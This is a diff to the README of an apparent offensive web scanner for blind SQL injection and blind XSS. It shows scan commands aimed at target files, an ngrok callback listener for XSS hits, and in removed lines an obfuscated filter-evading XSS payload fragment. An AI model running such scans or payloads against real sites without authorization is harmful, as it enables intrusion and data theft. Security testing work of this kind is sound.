@@ -8,12 +8,6 @@ pip install -r requirements.txt
 
 Ensure the Burp parameter wordlist remains present at [recon/wordlists/burp_parameter_names.txt](recon/wordlists/burp_parameter_names.txt); recon will fail fast if the file is missing.
 
-**For URL discovery (gau):** Install `gau` (optional but recommended for domain-based recon):
-```bash
-go install github.com/lc/gau/v2/cmd/gau@latest
-```
-Without gau, use `-f` to supply a URL file instead of `-u` domain.
-
 ## Common Commands
 
 ### 1. Blind SQL Injection - Single Domain with Recon
@@ -87,19 +81,13 @@ python main.py -f targets.txt --scan bxss --listener https://abc123.ngrok.io --w
 
 ### 4. Raw HTTP Request (sqlmap -r style)
 
-**Scan a specific HTTP request for SQLi**
+**Scan a specific HTTP request**
 
 ```bash
-python main.py --raw request.txt --scan sqli
+python main.py --raw request.txt
 ```
 
-**Scan a POST request for Blind XSS**
-
-```bash
-python main.py --raw post_request.txt --scan bxss --listener https://abc123.ngrok.io --wait 120
-```
-
-**request.txt format (any HTTP method):**
+**request.txt format:**
 ```
 POST /api/search HTTP/1.1
 Host: vulnerable.com
@@ -108,7 +96,7 @@ Content-Type: application/json
 {"query":"test","page":1}
 ```
 
-**Supports both SQLi and BXSS.** For BXSS, provide `--listener` and `--wait` flags.
+**Note:** Only supports SQLi scanning (not BXSS)
 
 ---
 
@@ -141,25 +129,11 @@ Content-Type: application/json
 
 `bxss/output/findings_xss.txt`:
 ```
-[+] XSS on text (http://127.0.0.1:5000/search)
-    Confidence: N/A (ML not trained)
-    Delay: 1.66s
-    Payload: < div onmouseover="var a=document.createElement('scr< !-- -- >ipt');...
-
-[ML] Scored 22 findings with anomaly detection
+[+] XSS on search (http://example.com/search?q=<payload>)
+    Confidence: HIGH
+    Callback received after 2.3 seconds
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64)
 ```
-
-**Understanding the output:**
-
-- **Target: text** = parameter name being tested
-- **Delay: 0.42s - 1.73s** = callback delay (0.4s+ indicates XSS)
-- **ML: N/A** = ML confidence (train model to enable scores)
-- **Obfuscated payloads** = intentional filter evasion variants
-
-**Interpreting delays:**
-- **< 0.5s** = likely benign
-- **0.5-1.5s** = suspicious (possible XSS)
-- **> 1.5s** = highly suspicious (confirmed XSS)
 
 ---
 
@@ -170,9 +144,8 @@ Content-Type: application/json
 **Cause:** Recon didn't find any URLs with parameters
 
 **Solution:**
-- Use `-f file.txt` with manually collected URLs instead of `-u` domain
+- Use `-f file.txt` with manually collected URLs
 - Ensure target has query parameters (`?param=value`)
-- Install `gau` for domain-based recon: `go install github.com/lc/gau/v2/cmd/gau@latest`
 
 ### "BXSS scan requires --listener URL"
 
@@ -181,18 +154,7 @@ Content-Type: application/json
 **Solution:**
 - Start ngrok: `ngrok http 5000`
 - Add to command: `--listener https://[ngrok-url]`
-- Example: `--listener https://abc123.ngrok-free.app`
-- Account setup: https://ngrok.com
-
-### "No callbacks correlated"
-
-**Cause:** Injected payloads aren't triggering or UUID mismatch
-
-**Solution:**
-- Check target is vulnerable (test with demo app first)
-- Ensure callback server is running (check ngrok dashboard)
-- Verify ngrok URL is correct in command
-- Payloads have obfuscation variants; delays of 0.4s+ are suspicious even without callbacks
+- Example: `--listener https://abc123.ngrok.io`
 
 ### "Failed to read file"
 
@@ -204,8 +166,6 @@ Content-Type: application/json
 ls targets.txt
 
 # Ensure readable
-chmod 644 targets.txt
-```
 cat targets.txt | head -5
 ```
 
